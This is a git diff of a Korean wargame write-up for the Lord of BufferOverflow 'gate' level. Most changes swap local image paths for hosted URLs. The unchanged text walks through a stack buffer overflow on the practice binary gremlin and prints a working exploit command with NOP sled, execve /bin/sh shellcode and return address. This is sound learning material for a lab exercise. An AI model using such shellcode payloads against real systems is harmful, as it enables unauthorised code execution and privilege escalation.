@@ -2,8 +2,7 @@
 
 ## 주어진 파일
 
-![1567941739468](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941739468-1568525084718.png)
-
+![1567941739468](https://user-images.githubusercontent.com/52530785/64917066-bd3e8b80-d7c6-11e9-9d72-9cb26dfdacf1.png)
 
 
 ID : gate
@@ -12,13 +11,13 @@ PW : gate로 접속한다.
 
 
 
-![1567941702228](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941702228.png)
+![1567941702228](https://user-images.githubusercontent.com/52530785/64917065-bca5f500-d7c6-11e9-80a8-29d1e5dfac99.png)
 
 ```c
 vi gremlin.c
 ```
 
-![1567930461328](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567930461328.png)
+![1567930461328](https://user-images.githubusercontent.com/52530785/64917072-bdd72200-d7c6-11e9-9d50-871b82e01c05.png)
 
 
 
@@ -41,7 +40,7 @@ mkdir tmp
 cp gremlin tmp/
 ```
 
-![1567941473987](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941473987.png)
+![1567941473987](https://user-images.githubusercontent.com/52530785/64917064-bca5f500-d7c6-11e9-87c0-b57496d2586b.png)
 
 
 
@@ -55,7 +54,7 @@ cp gremlin tmp/
 gdb gremlin
 ```
 
-![1567931017425](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567931017425.png)
+![1567931017425](https://user-images.githubusercontent.com/52530785/64917056-bb74c800-d7c6-11e9-9aa2-a25aeb459a51.png)
 
 
 
@@ -63,7 +62,7 @@ gdb로 main문을 보면 sub 0x100으로 버퍼 크기인 256 바이트가 보�
 
 
 
-![1567930817522](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567930817522.png)
+![1567930817522](https://user-images.githubusercontent.com/52530785/64917055-bb74c800-d7c6-11e9-9d84-fed0cdec97da.png)
 
 위의 프로그램은 버퍼에 256 byte, SFP에 4 byte, RET에 4 byte 가 들어가서 
 
@@ -108,9 +107,8 @@ SFP의 크기는 4 byte
 
 ## 쉘코드
 
-- https://security-nanglam.tistory.com/117 에서 쉘코드 가져옴
+![1567941320888](https://user-images.githubusercontent.com/52530785/64917129-15c25880-d7c8-11e9-8b5c-b4b095005f72.png)
 
-![1567941320888](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567941320888.png)
 
 ```c
 \x90으로 215 바이트
@@ -143,7 +141,7 @@ SFP의 크기는 4 byte
 gdb gremlin 명령어를 통해 gdb를 열고 위의 POC를 적는다.
 ```
 
-![1567939292222](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567939292222.png)
+![1567939292222](https://user-images.githubusercontent.com/52530785/64917058-bc0d5e80-d7c6-11e9-8b88-6c95eab1fa1f.png)
 
 
 
@@ -153,7 +151,7 @@ gdb gremlin 명령어를 통해 gdb를 열고 위의 POC를 적는다.
 
 - RET에 0x61616161이 들어갔으므로 eip에 들어간다.
 
-![1567939240330](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567939240330.png)
+![1567939240330](https://user-images.githubusercontent.com/52530785/64917057-bb74c800-d7c6-11e9-9bad-02fc344ca5e0.png)
 
 
 
@@ -161,7 +159,7 @@ gdb gremlin 명령어를 통해 gdb를 열고 위의 POC를 적는다.
 x/100wx $esp+300 명령어로 어떻게 값이 들어갔는지 보면
 ```
 
-![1567939933686](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567939933686.png)
+![1567939933686](https://user-images.githubusercontent.com/52530785/64917059-bc0d5e80-d7c6-11e9-9940-caf82cd73ceb.png)
 
 위와 같이 Nop으로 값이 채워지고, 중간에 쉘코드, Nop, RET 값이 들어가는 것을 볼 수 있다.
 
@@ -169,7 +167,7 @@ x/100wx $esp+300 명령어로 어떻게 값이 들어갔는지 보면
 
 하지만 tmp 디렉터리 내에서 실행하면 gremlin 파일이 gate 권한을 가지고 있으므로, main으로 돌아가서 실행한다.
 
-![1567942068037](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567942068037.png)
+![1567942068037](https://user-images.githubusercontent.com/52530785/64917070-bdd72200-d7c6-11e9-8dff-1f75f968d658.png)
 
 ```c
 ./gremlin `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*20+"\xdc\xfb\xff\xbf"'`
@@ -191,7 +189,7 @@ x/100wx $esp+300 명령어로 어떻게 값이 들어갔는지 보면
 
 - segmentation fault 날 때 core dumped 를 통해 나오는 core 파일을 확인한다.
 
-![1567940758653](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567940758653.png)
+![1567940758653](https://user-images.githubusercontent.com/52530785/64917060-bc0d5e80-d7c6-11e9-9d18-ca95717badab.png)
 
 위와 같이 core dumped가 나오면
 
@@ -199,7 +197,7 @@ x/100wx $esp+300 명령어로 어떻게 값이 들어갔는지 보면
 
 다음과 같이 core 파일이 생긴다.
 
-![1567941218417](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941218417.png)
+![1567941218417](https://user-images.githubusercontent.com/52530785/64917063-bca5f500-d7c6-11e9-9b75-bf33f6e57427.png)
 
 
 
@@ -207,7 +205,7 @@ x/100wx $esp+300 명령어로 어떻게 값이 들어갔는지 보면
 gdb -c core 명령어를 통해 들어간 후
 ```
 
-![1567940878365](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567940878365.png)
+![1567940878365](https://user-images.githubusercontent.com/52530785/64917061-bc0d5e80-d7c6-11e9-8e0b-466fc4d3366c.png)
 
 
 
@@ -215,7 +213,7 @@ gdb -c core 명령어를 통해 들어간 후
 x/100wx $esp+300 값을 통해 값이 어디에 들어갔는지 확인해본다.
 ```
 
-![1567941114068](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941114068.png)
+![1567941114068](https://user-images.githubusercontent.com/52530785/64917062-bca5f500-d7c6-11e9-9e9c-0db3d87e1d26.png)
 
 
 
@@ -223,7 +221,8 @@ x/100wx $esp+300 값을 통해 값이 어디에 들어갔는지 확인해본다.
 
 하지만 tmp 디렉터리 내에서 실행하면 gremlin 파일이 gate 권한을 가지고 있으므로, main으로 돌아가서 실행한다.
 
-![1567942068037](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567942068037-1568525258114.png)
+![1567942068037-1568525258114](https://user-images.githubusercontent.com/52530785/64917071-bdd72200-d7c6-11e9-97ae-2b51d32d9df7.png)
+
 
 
 
@@ -231,13 +230,13 @@ x/100wx $esp+300 값을 통해 값이 어디에 들어갔는지 확인해본다.
 ./gremlin `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*20+"\xcc\xfb\xff\xbf"'`
 ```
 
-![1567941814846](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941814846.png)
+![1567941814846](https://user-images.githubusercontent.com/52530785/64917068-bd3e8b80-d7c6-11e9-86d6-97af16e845a1.png)
 
 쉘이 뜬다.
 
 
 
-![1567941853794](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941853794.png)
+![1567941853794](https://user-images.githubusercontent.com/52530785/64917069-bdd72200-d7c6-11e9-91af-320ad4cbfafc.png)
 
 ID를 보면 gremlin이 있다.
 
